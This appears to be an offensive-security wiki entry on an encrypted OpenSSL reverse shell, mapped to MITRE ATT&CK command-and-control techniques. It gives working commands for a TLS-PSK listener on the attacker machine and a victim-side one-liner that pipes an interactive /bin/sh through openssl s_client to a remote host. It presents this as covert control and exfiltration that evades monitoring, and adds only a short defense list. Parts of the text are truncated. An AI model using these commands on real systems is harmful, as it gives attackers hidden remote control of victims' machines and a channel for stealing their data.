---
id: 0b999b4c-0927-485b-9be7-507b8c28de1f
name: OpenSSL Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.452909+00:00'
updated_at: '2023-04-10T20:25:34.094206+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Encrypted Channel|T1573 - Encrypted Channel]]'
- '[[Non-Standard Port|T1571 - Non-Standard Port]]'
tags:
- '[[OpenSSL]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
commands:
- '[[Generate 384-bit PSK]]'
- '[[Start OpenSSL client with PSK]]'
- '[[Start OpenSSL server with PSK]]'
---

# OpenSSL Reverse Shell

## Summary

The OpenSSL Reverse Shell technique allows an attacker to establish a secure encrypted channel with a compromised host, providing a covert Command and Control (C2) channel for remote access and data exfiltration. This technique leverages the SSL/TLS protocol to create a secure connection between th

## Description

# Description

The OpenSSL Reverse Shell technique allows an attacker to establish a secure encrypted channel with a compromised host, providing a covert Command and Control (C2) channel for remote access and data exfiltration. This technique leverages the SSL/TLS protocol to create a secure connection between the attacker and the target host, while also using encryption to evade detection by security monitoring tools. By using a non-standard port and encrypting traffic, the attacker can bypass network-based detection mechanisms and maintain persistence on the target host.

Technical Explanation: This technique relies on OpenSSL, an open-source implementation of the SSL/TLS protocol, to establish a secure connection between the attacker and the target host. The attacker creates a listener on their own system and sends a reverse shell payload to the target host. The target host then connects back to the attacker's system over the encrypted channel, providing the attacker with remote access to the target system. The attacker can then execute commands on the target system and exfiltrate data over the encrypted channel.

Business Value: This technique can be used by attackers to maintain persistent access to a compromised host, allowing them to continue to exfiltrate sensitive data and execute commands on the target system. By using encryption and a non-standard port, the attacker can evade detection by security monitoring tools, making it more difficult for defenders to detect and respond to the attack.

## Requirements

1. Access to a compromised host

1. OpenSSL installed on the attacker's system and the target host

1. Ability to create a listener on the attacker's system

## Defense

1. Monitor network traffic for unusual SSL/TLS connections and non-standard ports

1. Implement SSL/TLS inspection to detect and block malicious connections

1. Use endpoint detection and response tools to detect and respond to malicious activity on the target host

## Objectives

1. Establish a covert Command and Control (C2) channel with a compromised host

1. Maintain persistent access to the compromised host

1. Execute commands on the target system

1. Exfiltrate sensitive data from the target system

# Instructions

1. To establish a reverse shell, the attacker generates a self-signed certificate and starts an SSL/TLS server on their machine using the certificate. The victim is then tricked into connecting to the SSL/TLS server and a shell is spawned on the attacker's machine. The victim's shell is redirected to the SSL/TLS server using OpenSSL s_client command.

**Code**: [[user@attack$ openssl req -x509 -newkey rsa:4096 -k]]

> - openssl req: This command generates a self-signed certificate.
- -x509: This option specifies that a self-signed certificate is to be generated.
- -newkey rsa:4096: This option specifies the type of key to be generated and its size.
- -keyout key.pem: This option specifies the output file for the private key.
- -out cert.pem: This option specifies the output file for the certificate.
- -days 365: This option specifies the validity period of the certificate.
- -nodes: This option specifies that the private key should not be encrypted.
- openssl s_server: This command starts an SSL/TLS server using the generated certificate and private key.
- -quiet: This option specifies that only errors should be printed to the console.
- -key key.pem: This option specifies the private key to use for the SSL/TLS server.
- -cert cert.pem: This option specifies the certificate to use for the SSL/TLS server.
- -port 4242: This option specifies the port on which to listen for incoming connections.
- ncat: This command is an alternative to openssl s_server and starts an SSL/TLS server on the specified port.
- --ssl: This option specifies that SSL/TLS should be used for the connection.
- -vv: This option specifies verbose output.
- -l: This option specifies that ncat should listen for incoming connections.
- -p 4242: This option specifies the port on which to listen for incoming connections.
- mkfifo: This command creates a named pipe.
- /tmp/s: This is the name of the named pipe.
- /bin/sh -i < /tmp/s 2>&1: This command spawns a shell and redirects its input and output to the named pipe.
- openssl s_client: This command connects to the SSL/TLS server.
- -quiet: This option specifies that only errors should be printed to the console.
- -connect 10.0.0.1:4242: This option specifies the IP address and port of the SSL/TLS server to connect to.
- > /tmp/s: This command redirects the output of the shell to the named pipe.
- rm /tmp/s: This command removes the named pipe.

2. To use this command, first generate a 384-bit PSK by running the command "openssl rand -hex 48". Then, replace the value of the two PSK variables ("PSK=replacewithgeneratedpskfromabove") with the generated PSK. Next, run the server command on the attacker machine and the client command on the victim machine. This will create a secure TLS-PSK connection between the two machines.

**Code**: [[# generate 384-bit PSK
# use the generated string ]]

> TLS-PSK is a secure method of communication that does not rely on PKI or self-signed certificates. Instead, it uses a pre-shared key (PSK) that is known to both the client and server. This command generates a PSK and provides instructions for setting up a TLS-PSK connection between an attacker and victim machine. The server command sets up the TLS-PSK listener on the attacker machine, while the client command connects to the listener on the victim machine. Once the connection is established, the attacker can execute commands on the victim machine.

**Command** ([[Generate 384-bit PSK]]):

```bash
openssl rand -hex 48
```

**Command** ([[Start OpenSSL server with PSK]]):

```bash
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
```

**Command** ([[Start OpenSSL client with PSK]]):

```bash
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Encrypted Channel|T1573 - Encrypted Channel]]
- [[Non-Standard Port|T1571 - Non-Standard Port]]

## Commands Used

- [[Generate 384-bit PSK]]
- [[Start OpenSSL client with PSK]]
- [[Start OpenSSL server with PSK]]

## Tags

- [[OpenSSL]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
